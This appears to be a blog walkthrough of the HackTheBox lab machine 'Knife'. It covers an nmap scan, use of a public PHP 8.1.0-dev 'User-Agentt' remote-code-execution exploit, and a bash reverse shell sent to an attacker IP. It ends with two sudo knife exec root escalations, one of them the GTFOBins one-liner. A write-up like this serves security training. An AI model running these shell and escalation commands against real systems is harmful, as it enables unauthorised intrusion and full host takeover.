---
title: "HackTheBox Machine - Knife"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: false
categories: 
  - HackTheBox Machine
toc: true
toc_label: "Contents"
last_modified_at: 2021-08-30 14:51:00
---

![HTB Knife](/assets/images/htb-machine-knife/intro.png)

# Summary
- PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
- Knife privillege escalation via ruby gem execution 
- Knife sudo privillege escalation

# Network Scanning
Nmap network scanning result:
```bash
# Nmap 7.91 scan initiated Sun Jun 13 11:15:22 2021 as: nmap -vvv -p 22,80 -sC -sV -T4 -A -oN nmap 10.129.160.5
Nmap scan report for 10.129.160.5
Host is up, received syn-ack (0.29s latency).
Scanned at 2021-06-13 11:15:22 WIB for 18s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 13 11:15:40 2021 -- 1 IP address (1 host up) scanned in 18.21 seconds
```

# Enumeration
From Nmap network scanning, we found two ports: port 22, and port 80. Let's enumerate port 80.
## Port 80 - http service, PHP 8.1.0-dev vulnerability
Port 80, the HTTP service was run with server technology `Apache 2.4.41`, and the web page contained a static webpage, so we tried to enumerate on the header from the web page.
![Port 80 web service](/assets/images/htb-machine-knife/port80-1.png)

The webpage was powered by `PHP 8.1.0-dev`

![Port 80 web service](/assets/images/htb-machine-knife/port80-2.png)

Let's find the vulnerability of `PHP 8.1.0-dev` using `searchploit`:
```bash
$ searchsploit 'PHP 8.1.0-dev'
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
[SNIP]
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                             | php/webapps/49933.py
[SNIP]
-------------------------------------------------------------------------------- ---------------------------------
```
and, another information from exploit-db - PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution - [https://www.exploit-db.com/exploits/49933](https://www.exploit-db.com/exploits/49933)

![PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution](/assets/images/htb-machine-knife/php8dev.png)

Then, download the exploit script into our kali machine, and let's run the exploit, then put url target.
```bash
┌──(twseptian㉿lab)-[~/lab/hackthebox/boxes/knife]
└─$ python3 49933.py 
Enter the full host url:
http://10.129.160.5/

Interactive shell is opened on http://10.129.160.5/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ 
```
let's create a new reverse shell connection
```bash
$ /bin/bash -c "bash -i >& /dev/tcp/10.10.14.30/4444 0>&1"
```
prepare the reverse shell `nc -lvnp 4444`
```bash
┌──(twseptian㉿lab)-[~/lab/hackthebox/boxes/knife]
└─$ nc -lvnp 4444                                                                                             1 ⨯
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.160.5.
Ncat: Connection from 10.129.160.5:47146.
bash: cannot set terminal process group (862): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
james@knife:~$ cd /home/james
cd /home/james
james@knife:~$ 
james@knife:~$ wc -c user.txt
wc -c user.txt
33 user.txt
james@knife:~$ 
```

# Privilege Escalation
check `sudo -l`
```bash
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```
## Knife privillege escalation via ruby gem execution 
check strings of `/usr/bin/knife`
```bash
#!/opt/chef-workstation/embedded/bin/ruby --disable-gems
#--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1--
require "rubygems"

begin
  # this works around rubygems/rubygems#2196 and can be removed in rubygems > 2.7.6
  require "rubygems/bundler_version_finder"
rescue LoadError
  # probably means rubygems is too old or too new to have this class, and we don't care
end

# avoid appbundling if we are definitely running within a Bundler bundle.
# most likely the check for defined?(Bundler) is enough since we don't require
# bundler above, but just for paranoia's sake also we test to see if Bundler is
# really doing its thing or not.
unless defined?(Bundler) && Bundler.instance_variable_defined?("@load")
  ENV["GEM_HOME"] = ENV["GEM_PATH"] = nil unless ENV["APPBUNDLER_ALLOW_RVM"] == "true"
  ::Gem.clear_paths

  gem "activesupport", "= 5.2.4.5"
  gem "addressable", "= 2.7.0"
  gem "appbundler", "= 0.13.2"
  gem "artifactory", "= 3.0.15"
  gem "ast", "= 2.4.2"
  gem "aws-eventstream", "= 1.1.0"
  gem "aws-partitions", "= 1.427.0"
  gem "aws-sdk-apigateway", "= 1.59.0"
  gem "aws-sdk-apigatewayv2", "= 1.31.0"
  gem "aws-sdk-applicationautoscaling", "= 1.49.0"
  gem "aws-sdk-athena", "= 1.35.0"
  gem "aws-sdk-autoscaling", "= 1.53.0"
  gem "aws-sdk-batch", "= 1.43.0"
  gem "aws-sdk-budgets", "= 1.37.0"
  gem "aws-sdk-cloudformation", "= 1.47.0"
  gem "aws-sdk-cloudfront", "= 1.48.0"
  gem "aws-sdk-cloudhsm", "= 1.28.0"
  gem "aws-sdk-cloudhsmv2", "= 1.32.0"
  gem "aws-sdk-cloudtrail", "= 1.33.0"
  gem "aws-sdk-cloudwatch", "= 1.49.0"
  gem "aws-sdk-cloudwatchevents", "= 1.40.0"
  gem "aws-sdk-cloudwatchlogs", "= 1.39.0"
  gem "aws-sdk-codecommit", "= 1.41.0"
  gem "aws-sdk-codedeploy", "= 1.38.0"
  gem "aws-sdk-codepipeline", "= 1.41.0"
  gem "aws-sdk-cognitoidentity", "= 1.29.0"
  gem "aws-sdk-cognitoidentityprovider", "= 1.48.0"
  gem "aws-sdk-configservice", "= 1.57.0"
  gem "aws-sdk-core", "= 3.112.0"
  gem "aws-sdk-costandusagereportservice", "= 1.29.0"
  gem "aws-sdk-databasemigrationservice", "= 1.50.0"
  gem "aws-sdk-dynamodb", "= 1.59.0"
  gem "aws-sdk-ec2", "= 1.224.0"
  gem "aws-sdk-ecr", "= 1.41.0"
  gem "aws-sdk-ecs", "= 1.74.0"
  gem "aws-sdk-efs", "= 1.37.0"
  gem "aws-sdk-eks", "= 1.48.0"
  gem "aws-sdk-elasticache", "= 1.53.0"
  gem "aws-sdk-elasticbeanstalk", "= 1.41.0"
  gem "aws-sdk-elasticloadbalancing", "= 1.30.0"
  gem "aws-sdk-elasticloadbalancingv2", "= 1.60.0"
  gem "aws-sdk-elasticsearchservice", "= 1.48.0"
  gem "aws-sdk-firehose", "= 1.36.0"
  gem "aws-sdk-glue", "= 1.82.0"
  gem "aws-sdk-guardduty", "= 1.44.0"
  gem "aws-sdk-iam", "= 1.48.0"
  gem "aws-sdk-kafka", "= 1.34.0"
  gem "aws-sdk-kinesis", "= 1.31.0"
  gem "aws-sdk-kms", "= 1.42.0"
  gem "aws-sdk-lambda", "= 1.59.0"
  gem "aws-sdk-organizations", "= 1.55.0"
  gem "aws-sdk-ram", "= 1.22.0"
  gem "aws-sdk-rds", "= 1.114.0"
  gem "aws-sdk-redshift", "= 1.54.0"
  gem "aws-sdk-route53", "= 1.46.0"
  gem "aws-sdk-route53domains", "= 1.29.0"
  gem "aws-sdk-route53resolver", "= 1.23.0"
  gem "aws-sdk-s3", "= 1.88.1"
  gem "aws-sdk-secretsmanager", "= 1.43.0"
  gem "aws-sdk-securityhub", "= 1.40.0"
  gem "aws-sdk-servicecatalog", "= 1.57.0"
  gem "aws-sdk-ses", "= 1.37.0"
  gem "aws-sdk-shield", "= 1.34.0"
  gem "aws-sdk-sms", "= 1.28.0"
  gem "aws-sdk-sns", "= 1.38.0"
  gem "aws-sdk-sqs", "= 1.36.0"
  gem "aws-sdk-ssm", "= 1.104.0"
  gem "aws-sdk-states", "= 1.37.0"
  gem "aws-sdk-transfer", "= 1.29.0"
  gem "aws-sigv4", "= 1.2.2"
  gem "axiom-types", "= 0.1.1"
  gem "azure_graph_rbac", "= 0.17.2"
  gem "azure_mgmt_compute", "= 0.21.1"
  gem "azure_mgmt_key_vault", "= 0.17.7"
  gem "azure_mgmt_network", "= 0.26.0"
  gem "azure_mgmt_resources", "= 0.18.1"
  gem "azure_mgmt_security", "= 0.19.0"
  gem "azure_mgmt_storage", "= 0.22.0"
  gem "bcrypt_pbkdf", "= 1.1.0.rc2"
  gem "bcrypt_pbkdf", "= 1.1.0.rc2"
  gem "bcrypt_pbkdf", "= 1.1.0.rc2"
  gem "berkshelf", "= 7.2.0"
  gem "binding_of_caller", "= 1.0.0"
  gem "builder", "= 3.2.4"
  gem "byebug", "= 11.1.3"
  gem "chef", "= 16.10.8"
  gem "chef", "= 16.10.8"
  gem "chef-apply", "= 0.5.3"
  gem "chef-bin", "= 16.10.8"
  gem "chef-cli", "= 3.1.1"
  gem "chef-config", "= 16.10.8"
  gem "chef-telemetry", "= 1.0.14"
  gem "chef-utils", "= 16.10.8"
  gem "chef-vault", "= 4.1.0"
  gem "chef-zero", "= 15.0.4"
  gem "chef_deprecations", "= 0.1.2"
  gem "cheffish", "= 16.0.12"
  gem "chefspec", "= 9.2.1"
  gem "chefstyle", "= 1.7.1"
  gem "citrus", "= 3.0.2"
  gem "cleanroom", "= 1.0.0"
  gem "coderay", "= 1.1.3"
  gem "coercible", "= 1.0.0"
  gem "concurrent-ruby", "= 1.1.8"
  gem "cookbook-omnifetch", "= 0.11.1"
  gem "cookstyle", "= 7.8.0"
  gem "debug_inspector", "= 1.0.0"
  gem "declarative", "= 0.0.20"
  gem "declarative-option", "= 0.1.0"
  gem "dep-selector-libgecode", "= 1.3.5"
  gem "dep_selector", "= 1.0.6"
  gem "descendants_tracker", "= 0.0.4"
  gem "diff-lcs", "= 1.3"
  gem "docker-api", "= 2.0.0"
  gem "domain_name", "= 0.5.20190701"
  gem "droplet_kit", "= 3.13.0"
  gem "ed25519", "= 1.2.4"
  gem "equalizer", "= 0.0.11"
  gem "erubi", "= 1.10.0"
  gem "erubis", "= 2.7.0"
  gem "excon", "= 0.79.0"
  gem "faraday", "= 1.3.0"
  gem "faraday-cookie_jar", "= 0.0.7"
  gem "faraday-net_http", "= 1.0.1"
  gem "faraday_middleware", "= 1.0.0"
  gem "fauxhai-ng", "= 8.7.0"
  gem "ffi", "= 1.14.2"
  gem "ffi", "= 1.14.2"
  gem "ffi", "= 1.14.2"
  gem "ffi-libarchive", "= 1.0.17"
  gem "ffi-yajl", "= 2.3.4"
  gem "filesize", "= 0.2.0"
  gem "fog-core", "= 2.2.3"
  gem "fog-json", "= 1.2.0"
  gem "fog-openstack", "= 1.0.11"
  gem "formatador", "= 0.2.5"
  gem "fuzzyurl", "= 0.9.0"
  gem "gcewinpass", "= 1.1.0"
  gem "google-api-client", "= 0.42.2"
  gem "googleauth", "= 0.14.0"
  gem "gssapi", "= 1.3.1"
  gem "guard", "= 2.16.2"
  gem "gyoku", "= 1.3.1"
  gem "hashie", "= 4.1.0"
  gem "highline", "= 2.0.3"
  gem "http-cookie", "= 1.0.3"
  gem "httpclient", "= 2.8.3"
  gem "i18n", "= 1.8.9"
  gem "ice_nine", "= 0.11.2"
  gem "inifile", "= 3.0.0"
  gem "iniparse", "= 1.5.0"
  gem "inspec", "= 4.26.4"
  gem "inspec-bin", "= 4.26.4"
  gem "inspec-core", "= 4.26.4"
  gem "ipaddress", "= 0.8.3"
  gem "jmespath", "= 1.4.0"
  gem "json", "= 2.5.1"
  gem "jwt", "= 2.2.2"
  gem "kartograph", "= 0.2.8"
  gem "kitchen-azurerm", "= 1.5.0"
  gem "kitchen-digitalocean", "= 0.11.2"
  gem "kitchen-dokken", "= 2.11.2"
  gem "kitchen-ec2", "= 3.8.0"
  gem "kitchen-google", "= 2.2.0"
  gem "kitchen-hyperv", "= 0.5.5"
  gem "kitchen-inspec", "= 2.3.0"
  gem "kitchen-openstack", "= 5.0.1"
  gem "kitchen-vagrant", "= 1.8.0"
  gem "kitchen-vcenter", "= 2.9.8"
  gem "knife-azure", "= 3.0.6"
  gem "knife-cloud", "= 4.0.15"
  gem "knife-ec2", "= 2.1.3"
  gem "knife-google", "= 5.0.8"
  gem "knife-opc", "= 0.4.7"
  gem "knife-tidy", "= 2.1.2"
  gem "knife-vcenter", "= 5.0.5"
  gem "knife-vsphere", "= 4.1.7"
  gem "knife-windows", "= 4.0.6"
  gem "kramdown", "= 2.3.0"
  gem "kramdown-parser-gfm", "= 1.1.0"
  gem "libyajl2", "= 1.2.0"
  gem "license-acceptance", "= 2.1.13"
  gem "listen", "= 3.4.1"
  gem "little-plugger", "= 1.1.4"
  gem "lockfile", "= 2.1.3"
  gem "logging", "= 2.3.0"
  gem "lumberjack", "= 1.2.8"
  gem "mdl", "= 0.11.0"
  gem "memoist", "= 0.16.2"
  gem "method_source", "= 1.0.0"
  gem "mime-types", "= 3.3.1"
  gem "mime-types-data", "= 3.2021.0212"
  gem "mini_mime", "= 1.0.2"
  gem "mini_portile2", "= 2.4.0"
  gem "minitar", "= 0.9"
  gem "minitest", "= 5.13.0"
  gem "mixlib-archive", "= 1.1.4"
  gem "mixlib-archive", "= 1.1.4"
  gem "mixlib-authentication", "= 3.0.7"
  gem "mixlib-cli", "= 2.1.8"
  gem "mixlib-config", "= 3.0.9"
  gem "mixlib-install", "= 3.12.5"
  gem "mixlib-log", "= 3.0.9"
  gem "mixlib-shellout", "= 3.2.5"
  gem "mixlib-shellout", "= 3.2.5"
  gem "mixlib-versioning", "= 1.2.12"
  gem "molinillo", "= 0.7.0"
  gem "ms_rest", "= 0.7.6"
  gem "ms_rest_azure", "= 0.12.0"
  gem "multi_json", "= 1.15.0"
  gem "multipart-post", "= 2.1.1"
  gem "nenv", "= 0.3.0"
  gem "net-ping", "= 2.0.8"
  gem "net-scp", "= 3.0.0"
  gem "net-sftp", "= 3.0.0"
  gem "net-ssh", "= 6.1.0"
  gem "net-ssh-gateway", "= 2.0.0"
  gem "net-ssh-multi", "= 1.2.1"
  gem "netaddr", "= 1.5.1"
  gem "nokogiri", "= 1.10.10"
  gem "nokogiri", "= 1.10.10"
  gem "nokogiri", "= 1.10.10"
  gem "nori", "= 2.6.0"
  gem "notiffany", "= 0.1.3"
  gem "octokit", "= 4.20.0"
  gem "ohai", "= 16.10.6"
  gem "optimist", "= 3.0.1"
  gem "os", "= 1.1.1"
  gem "parallel", "= 1.20.1"
  gem "parser", "= 3.0.0.0"
  gem "parslet", "= 1.8.2"
  gem "pastel", "= 0.8.0"
  gem "plist", "= 3.6.0"
  gem "proxifier", "= 1.0.3"
  gem "pry", "= 0.13.1"
  gem "pry-byebug", "= 3.9.0"
  gem "pry-remote", "= 0.1.8"
  gem "pry-stack_explorer", "= 0.6.1"
  gem "public_suffix", "= 4.0.6"
  gem "r18n-core", "= 4.0.0"
  gem "r18n-desktop", "= 4.0.0"
  gem "rack", "= 2.2.3"
  gem "rainbow", "= 3.0.0"
  gem "rake", "= 13.0.1"
  gem "rb-fsevent", "= 0.10.4"
  gem "rb-inotify", "= 0.10.1"
  gem "rb-readline", "= 0.5.5"
  gem "rbvmomi", "= 3.0.0"
  gem "regexp_parser", "= 2.0.3"
  gem "representable", "= 3.0.4"
  gem "resource_kit", "= 0.1.7"
  gem "retriable", "= 3.1.2"
  gem "retryable", "= 3.0.5"
  gem "rexml", "= 3.2.4"
  gem "rspec", "= 3.10.0"
  gem "rspec-core", "= 3.10.1"
  gem "rspec-expectations", "= 3.10.1"
  gem "rspec-its", "= 1.3.0"
  gem "rspec-mocks", "= 3.10.2"
  gem "rspec-support", "= 3.10.2"
  gem "rubocop", "= 1.10.0"
  gem "rubocop-ast", "= 1.4.1"
  gem "ruby-progressbar", "= 1.11.0"
  gem "ruby-shadow", "= 2.5.0"
  gem "ruby2_keywords", "= 0.0.4"
  gem "rubyntlm", "= 0.6.3"
  gem "rubyzip", "= 2.3.0"
  gem "sawyer", "= 0.8.2"
  gem "semverse", "= 3.0.0"
  gem "shellany", "= 0.0.1"
  gem "signet", "= 0.14.1"
  gem "slop", "= 3.6.0"
  gem "solve", "= 4.0.4"
  gem "sshkey", "= 2.0.0"
  gem "sslshake", "= 1.3.1"
  gem "strings", "= 0.2.0"
  gem "strings-ansi", "= 0.2.0"
  gem "syslog-logger", "= 1.6.8"
  gem "test-kitchen", "= 2.10.0"
  gem "thor", "= 1.1.0"
  gem "thread_safe", "= 0.3.6"
  gem "timeliness", "= 0.3.10"
  gem "toml-rb", "= 2.0.1"
  gem "tomlrb", "= 1.3.0"
  gem "train", "= 3.4.9"
  gem "train-aws", "= 0.1.35"
  gem "train-core", "= 3.4.9"
  gem "train-habitat", "= 0.2.22"
  gem "train-winrm", "= 0.2.12"
  gem "tty-box", "= 0.7.0"
  gem "tty-color", "= 0.6.0"
  gem "tty-cursor", "= 0.7.1"
  gem "tty-prompt", "= 0.23.0"
  gem "tty-reader", "= 0.9.0"
  gem "tty-screen", "= 0.8.1"
  gem "tty-spinner", "= 0.9.3"
  gem "tty-table", "= 0.12.0"
  gem "tzinfo", "= 1.2.9"
  gem "uber", "= 0.1.0"
  gem "unf", "= 0.1.4"
  gem "unf_ext", "= 0.0.7.7"
  gem "unf_ext", "= 0.0.7.7"
  gem "unf_ext", "= 0.0.7.7"
  gem "unicode-display_width", "= 1.7.0"
  gem "unicode_utils", "= 1.4.0"
  gem "uuidtools", "= 2.2.0"
  gem "virtus", "= 1.0.5"
  gem "vsphere-automation-appliance", "= 0.4.7"
  gem "vsphere-automation-cis", "= 0.4.7"
  gem "vsphere-automation-content", "= 0.4.7"
  gem "vsphere-automation-runtime", "= 0.4.7"
  gem "vsphere-automation-sdk", "= 0.4.7"
  gem "vsphere-automation-vapi", "= 0.4.7"
  gem "vsphere-automation-vcenter", "= 0.4.7"
  gem "webrick", "= 1.7.0"
  gem "winrm", "= 2.3.6"
  gem "winrm-elevated", "= 1.2.3"
  gem "winrm-fs", "= 1.3.5"
  gem "wisper", "= 2.0.1"
  gem "wmi-lite", "= 1.0.5"
  gem "yard", "= 0.9.26"
  gem "chef", "= 16.10.8"
  gem "bundler" # force activation of bundler to avoid unresolved specs if there are multiple bundler versions
  spec = Gem::Specification.find_by_name("chef", "= 16.10.8")
else
  spec = Gem::Specification.find_by_name("chef")
end

unless Gem::Specification.unresolved_deps.empty?
  $stderr.puts "APPBUNDLER WARNING: unresolved deps are CRITICAL performance bug, this MUST be fixed"
  Gem::Specification.reset
end

bin_file = spec.bin_file("knife")

Kernel.load(bin_file)
```
ruby gem redirect to knife executable file to escalate root access. Let's create a simple ruby script 
```bash
james@knife:/tmp$ echo "system('/usr/bin/sh')" > root.rb
echo "system('/usr/bin/sh')" > root.rb
james@knife:/tmp$ chmod +x root.rb
james@knife:/tmp$ sudo /usr/bin/knife exec root.rb
james@knife:/tmp$ sudo /usr/bin/knife exec root.rb
sudo /usr/bin/knife exec root.rb
# whoami
whoami
root
#
```
![root](/assets/images/htb-machine-knife/root.png)

## Knife sudo privillege escalation
`knife` sudo privilege escalation - [https://gtfobins.github.io/gtfobins/knife/#sudo](https://gtfobins.github.io/gtfobins/knife/).
![knife](/assets/images/htb-machine-knife/knifesudo.png)
```bash
james@knife:/tmp$ sudo knife exec -E 'exec "/bin/sh"'
sudo knife exec -E 'exec "/bin/sh"'
# whoami
whoami
root
#
```
![root](/assets/images/htb-machine-knife/root2.png)